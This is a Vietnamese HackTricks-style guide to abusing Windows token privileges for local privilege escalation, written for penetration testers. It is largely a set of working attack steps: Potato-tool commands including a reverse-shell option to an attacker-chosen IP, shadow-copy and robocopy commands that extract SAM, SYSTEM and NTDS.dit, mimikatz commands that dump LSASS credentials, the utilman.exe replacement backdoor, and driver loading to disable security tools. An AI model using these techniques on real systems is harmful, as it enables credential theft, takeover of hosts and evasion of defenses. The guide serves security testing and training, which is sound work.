# Lạm dụng Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Nếu bạn **chưa biết Windows Access Tokens là gì**, hãy đọc trang này trước khi tiếp tục:


{{#ref}}
access-tokens.md
{{#endref}}

**Bạn có thể leo thang đặc quyền bằng cách lạm dụng các token mà mình đang giữ.**

### SeImpersonatePrivilege

Đặc quyền này cho phép một process mạo danh (nhưng không tạo) token khi nó có thể lấy được handle tới token đó. Có thể lấy token có đặc quyền từ một Windows service (DCOM) bằng cách khiến service thực hiện xác thực NTLM tới một exploit, sau đó cho phép thực thi một process với đặc quyền SYSTEM.<sup>[[2]](#references)</sup> Có thể khai thác primitive này bằng các công cụ như [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (yêu cầu WinRM bị tắt), [SweetPotato](https://github.com/CCob/SweetPotato) và [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Một web application chỉ lắng nghe trên loopback có thể là một hướng ép buộc riêng nếu người dùng cục bộ có thể truy cập endpoint đã xác thực, endpoint này gửi request tới URL do caller chọn dưới một danh tính có đặc quyền cao hơn. Hãy xem xét quyền hạn và các giới hạn URL của endpoint, danh tính thực tế của client gửi request ra ngoài cùng hành vi xác thực của client, và liệu client đó có thể truy cập listener do người dùng có đặc quyền thấp hơn kiểm soát hay không. Chỉ riêng việc bật `SeImpersonatePrivilege`, có IIS listener hoặc có tham số lấy URL không chứng minh rằng tồn tại token có đặc quyền hay con đường leo thang. Hãy thực hiện việc xem xét này một cách thụ động; không gửi request ép buộc trong quá trình liệt kê. Xem tài liệu của Microsoft về [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) và [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Ghi chú hiện đại dành cho operator:

- **JuicyPotato đã lỗi thời**: trên Windows 10 1809+/Server 2019+, hãy ưu tiên **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** hoặc **PrintSpoofer**, tùy thuộc vào bề mặt RPC/COM nào vẫn có thể truy cập.
- Nếu bạn đã compromise một service chạy dưới quyền **`LOCAL SERVICE`** hoặc **`NETWORK SERVICE`** và `whoami /priv` hiển thị **filtered token** không có `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, trước tiên hãy khôi phục **tập đặc quyền mặc định** của tài khoản (ví dụ bằng **FullPowers**), sau đó thử lại nhóm potato.<sup>[[3]](#references)</sup>
- Một số fork mới hơn thân thiện hơn với operator so với các công cụ gốc. Ví dụ, **SigmaPotato** bổ sung khả năng thực thi reflection/in-memory và tương thích với Windows hiện đại, còn **PrintNotifyPotato** lạm dụng PrintNotify COM service và thường hữu ích khi Spooler path cổ điển bị tắt.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Privilege này rất giống **SeImpersonatePrivilege**; nó sử dụng **cùng phương pháp** để lấy token có đặc quyền.\
Sau đó, privilege này cho phép **gán một primary token** cho tiến trình mới/đang tạm dừng. Với token mạo danh có đặc quyền, bạn có thể tạo một primary token (DuplicateTokenEx).\
Với token này, bạn có thể tạo **tiến trình mới** bằng 'CreateProcessAsUser' hoặc tạo tiến trình đang tạm dừng rồi **đặt token** (nói chung, bạn không thể sửa primary token của một tiến trình đang chạy).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Nếu bật token này, bạn có thể dùng **KERB_S4U_LOGON** để lấy **impersonation token** của bất kỳ người dùng nào mà không cần biết thông tin xác thực, **thêm một nhóm bất kỳ** (admins) vào token, đặt **mức integrity** của token thành "**medium**", rồi gán token này cho **thread hiện tại** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Privilege này khiến hệ thống **cấp quyền đọc mọi tệp** (chỉ giới hạn ở thao tác đọc). Nó được dùng để **đọc password hash của tài khoản Administrator cục bộ** từ registry, sau đó có thể dùng các công cụ như "**psexec**" hoặc "**wmiexec**" cùng với hash (kỹ thuật Pass-the-Hash). Tuy nhiên, kỹ thuật này không hoạt động trong hai trường hợp: tài khoản Local Administrator bị vô hiệu hóa, hoặc có policy loại bỏ quyền quản trị của Local Administrator khi kết nối từ xa.<sup>[[2]](#references)</sup>\
Trên thực tế, quy trình tích hợp sẵn đáng tin cậy nhất thường là **VSS + `robocopy /b`**: tạo/hiển thị shadow copy, sau đó sao chép `SAM`/`SYSTEM` hoặc `NTDS.dit` ở **backup mode**, qua đó bỏ qua các file ACL.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Bạn có thể **abuse privilege này** bằng cách:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- theo dõi **IppSec** trong [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Hoặc làm theo hướng dẫn trong phần **escalating privileges with Backup Operators** của:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Privilege này cấp quyền **ghi** vào bất kỳ file hệ thống nào, bất kể Access Control List (ACL) của file. Nó mở ra nhiều khả năng leo thang, bao gồm khả năng **sửa đổi services**, thực hiện DLL Hijacking và thiết lập **debuggers** thông qua Image File Execution Options, cùng nhiều kỹ thuật khác.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege là một quyền mạnh, đặc biệt hữu ích khi user có thể impersonate tokens, nhưng cũng có thể dùng khi không có SeImpersonatePrivilege. Khả năng này phụ thuộc vào việc impersonate một token đại diện cho cùng user và có integrity level không cao hơn integrity level của process hiện tại.<sup>[[2]](#references)</sup>

**Các điểm chính:**

- **Impersonation khi không có SeImpersonatePrivilege:** Có thể tận dụng SeCreateTokenPrivilege để thực hiện EoP bằng cách impersonate tokens trong những điều kiện cụ thể.
- **Điều kiện để impersonate token:** Để impersonation thành công, target token phải thuộc về cùng user và có integrity level thấp hơn hoặc bằng integrity level của process đang thực hiện impersonation.
- **Tạo và chỉnh sửa impersonation tokens:** User có thể tạo impersonation token và nâng cấp token bằng cách thêm SID (Security Identifier) của một privileged group.

### SeLoadDriverPrivilege

Privilege này cho phép process **load và unload device drivers** bằng cách tạo registry entry với các giá trị `ImagePath` và `Type` cụ thể. Vì quyền ghi trực tiếp vào `HKLM` (HKEY_LOCAL_MACHINE) bị hạn chế, có thể dùng `HKCU` (HKEY_CURRENT_USER) thay thế. Tuy nhiên, cần một path cụ thể để kernel nhận diện entry trong `HKCU` là cấu hình driver.<sup>[[2]](#references)</sup>

Trong các hoạt động tấn công hiện đại, cách dùng phổ biến thường là **BYOVD** (bring your own vulnerable driver): load một kernel driver **đã được ký nhưng có lỗ hổng**, sau đó dùng IOCTL của nó để vô hiệu hóa các cơ chế bảo vệ hoặc chuyển sang thực thi code trong kernel. Lưu ý rằng trên các bản Windows 11/Server mới, **Microsoft vulnerable driver blocklist** và/hoặc **HVCI/Memory Integrity** thường khiến các chuỗi khai thác công khai cũ không hoạt động. Vì vậy, các ví dụ kiểu `szkg64.sys` cổ điển không còn đáng tin cậy trong mọi trường hợp.

Path này là `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, trong đó `<RID>` là Relative Identifier của user hiện tại. Cần tạo toàn bộ path này trong `HKCU` và thiết lập hai giá trị:<sup>[[2]](#references)</sup>

- `ImagePath`, là path đến binary cần thực thi
- `Type`, có giá trị là `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Các bước thực hiện:**

1. Dùng `HKCU` thay vì `HKLM` do quyền ghi bị hạn chế.
2. Tạo path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` trong `HKCU`, trong đó `<RID>` là Relative Identifier của user hiện tại.
3. Đặt `ImagePath` thành path thực thi của binary.
4. Đặt `Type` thành `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Các cách khác để abuse privilege này tại [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Privilege này tương tự **SeRestorePrivilege**. Chức năng chính của nó cho phép một process **nhận quyền sở hữu một object**, bỏ qua yêu cầu về quyền truy cập tùy ý rõ ràng bằng cách cấp quyền WRITE_OWNER. Quy trình này trước tiên sẽ giành quyền sở hữu registry key cần ghi, sau đó thay đổi DACL để cho phép thao tác ghi.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Đặc quyền này cho phép **debug các tiến trình khác**, bao gồm đọc và ghi vào bộ nhớ. Có thể sử dụng đặc quyền này để triển khai nhiều chiến lược memory injection, có khả năng né tránh hầu hết các giải pháp antivirus và host intrusion prevention.<sup>[[2]](#references)</sup>

Trên các phiên bản Windows hiện đại, hãy nhớ rằng `SeDebugPrivilege` thường đủ để mở **các tiến trình SYSTEM không được bảo vệ** và sao chép token của chúng, nhưng **không** đảm bảo rằng bạn có thể truy cập **LSASS**. Nếu bật **RunAsPPL / LSA Protection**, các tiến trình không được bảo vệ sẽ không thể đọc hoặc inject vào LSASS, ngay cả khi có `SeDebugPrivilege`. Trong trường hợp đó, hãy lấy cắp token từ một tiến trình SYSTEM không dùng PPL khác, hoặc kết hợp với PPL bypass/BYOVD thay vì cho rằng `procdump` sẽ hoạt động. Để xem ví dụ đầy đủ về sao chép token bằng `SeDebugPrivilege` + `SeImpersonatePrivilege`, hãy xem [trang này](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Bạn có thể dùng [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) thuộc [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) để **thu thập bộ nhớ của một tiến trình**. Cụ thể, cách này có thể áp dụng cho tiến trình **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, chịu trách nhiệm lưu trữ thông tin xác thực của người dùng sau khi họ đăng nhập thành công vào hệ thống.

Sau đó, bạn có thể tải bản dump này vào mimikatz để lấy mật khẩu:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Một bản dump LSASS đã lưu trước đó và có thể đọc được có thể khả dụng ngay cả khi tài khoản hiện tại không có quyền thu thập tiến trình được bảo vệ đang chạy. Chỉ xem tệp dump hoặc archive có tên tương tự là manh mối: hãy xác minh quyền truy cập và nội dung, sau đó đánh giá xem thông tin xác thực được khôi phục còn hợp lệ hay không và có cấp quyền trong ngữ cảnh đặc quyền cao hơn hay không. Chỉ riêng tên tệp không chứng minh archive có chứa bản dump hoặc thông tin xác thực còn dùng được.

#### RCE

Nếu muốn có shell `NT SYSTEM`, bạn có thể dùng:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Quyền này (Thực hiện các tác vụ bảo trì volume) có thể hỗ trợ các thao tác đặc quyền trên volume, nhưng bản thân nó không đảm bảo có được handle đọc volume thô hoặc quyền truy cập tùy ý vào tệp. ACL của thiết bị, trạng thái token, phiên bản Windows và thao tác được yêu cầu vẫn rất quan trọng. Một thao tác điều khiển volume được cho phép có thể thay đổi ACL của hệ thống tệp; đây là hành động làm thay đổi dữ liệu, có khả năng ảnh hưởng đến toàn bộ volume. Trên máy chủ CA, việc lạm dụng certificate cũng đòi hỏi quyền truy cập vào private-key material có thể sử dụng được; các tệp được EFS bảo vệ vẫn cần khóa giải mã hoặc khôi phục được cấp quyền. Xem các điều kiện tiên quyết chi tiết bên dưới.<sup>[[5]](#references)</sup>

Xem các kỹ thuật và biện pháp giảm thiểu chi tiết:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Kiểm tra các đặc quyền

```
whoami /priv
```

Các **tokens hiển thị là Disabled** thường có thể được bật, vì vậy bạn thường có thể lạm dụng cả các quyền _Enabled_ và _Disabled_.

### Bật tất cả tokens

Nếu bạn có các quyền bị tắt, bạn có thể dùng script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) để bật tất cả tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Hoặc **script** được nhúng trong [**bài đăng này**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Bảng

Bảng cheatsheet đầy đủ về quyền token tại [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); phần tóm tắt bên dưới chỉ liệt kê những cách trực tiếp để khai thác quyền nhằm có được phiên admin hoặc đọc các tệp nhạy cảm.<sup>[[1]](#references)</sup>

| Quyền                      | Tác động     | Công cụ                | Quy trình thực thi                                                                                                                                                                                                                                                                                                                                     | Ghi chú                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | Công cụ bên thứ ba      | _"Quyền này cho phép người dùng mạo danh token và privesc lên nt system bằng các công cụ như potato.exe, rottenpotato.exe và juicypotato.exe"_                                                                                                                                                                                                      | Cảm ơn [Aurélien Chalot](https://twitter.com/Defte_) đã cập nhật. Tôi sẽ sớm thử diễn đạt lại theo dạng hướng dẫn từng bước dễ làm theo hơn.                                                                                                                                                                                         |
| **`SeBackup`**             | **Mối đe dọa** | _**Lệnh tích hợp sẵn**_ | Đọc các tệp nhạy cảm bằng `robocopy /b` hoặc các tiện ích sao chép chuyên dụng có hỗ trợ SeBackup.                                                                                                                                                                                                                                                                 | <p>- Hữu ích để đọc `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` và đôi khi cả `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` tiện dụng, nhưng các cmdlet/API SeBackup chuyên dụng thường linh hoạt hơn khi xử lý tệp đang bị khóa hoặc đang mở.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | Công cụ bên thứ ba      | Tạo token tùy ý, bao gồm cả quyền admin cục bộ, bằng `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Sao chép token SYSTEM **không thuộc PPL** hoặc dump bộ nhớ từ một tiến trình không được bảo vệ.                                                                                                                                                                                                                                                                 | <p>Việc dump LSASS thường bị chặn nếu bật RunAsPPL/LSA Protection.</p><p>Có thể tìm thấy script tại [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | Công cụ bên thứ ba      | Dùng **họ Potato** / mạo danh named-pipe để tạo tiến trình SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, v.v.).                                                                                                                                                                                    | <p>Thực tế nhất khi dùng từ các tài khoản dịch vụ như IIS APPPOOL, MSSQL, tác vụ đã lên lịch hoặc bất kỳ ngữ cảnh nào đã có `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | Công cụ bên thứ ba      | <p>1. Nạp một kernel driver đã ký nhưng có lỗ hổng (BYOVD)<br>2. Dùng IOCTL của driver để có quyền đọc/ghi kernel, vô hiệu hóa công cụ bảo mật hoặc nâng quyền lên SYSTEM<br><br>Ngoài ra, quyền này có thể được dùng để gỡ nạp các driver liên quan đến bảo mật bằng lệnh tích hợp sẵn <code>fltMC</code>, ví dụ: <code>fltMC sysmondrv</code></p>                     | <p>Các driver công khai đời cũ như <code>szkg64.sys</code> ngày càng bị chặn trên Windows hiện đại bởi danh sách chặn driver có lỗ hổng / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Khởi chạy PowerShell/ISE khi có quyền SeRestore.<br>2. Bật quyền bằng <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Đổi tên utilman.exe thành utilman.old<br>4. Đổi tên cmd.exe thành utilman.exe<br>5. Khóa console rồi nhấn Win+U</p> | <p>Một số phần mềm AV có thể phát hiện cuộc tấn công.</p><p>Phương pháp thay thế dựa vào việc thay thế các tệp nhị phân của dịch vụ được lưu trong "Program Files" bằng cùng quyền này</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Lệnh tích hợp sẵn**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Đổi tên cmd.exe thành utilman.exe<br>4. Khóa console rồi nhấn Win+U</p>                                                                                                                                       | <p>Một số phần mềm AV có thể phát hiện cuộc tấn công.</p><p>Phương pháp thay thế dựa vào việc thay thế các tệp nhị phân của dịch vụ được lưu trong "Program Files" bằng cùng quyền này.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | Công cụ bên thứ ba      | <p>Thao tác token để có thêm quyền admin cục bộ. Có thể cần SeImpersonate.</p><p>Cần xác minh.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - các đường khai thác từ quyền Windows lên admin](https://github.com/gtworek/Priv2Admin)
- [2] [Lạm dụng quyền token để LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Trả lại các quyền cho tôi! Làm ơn?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (chế độ sao lưu `/b` bỏ qua kiểm tra ACL của tệp/thư mục)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Thực hiện tác vụ bảo trì ổ đĩa (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → trích xuất khóa CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
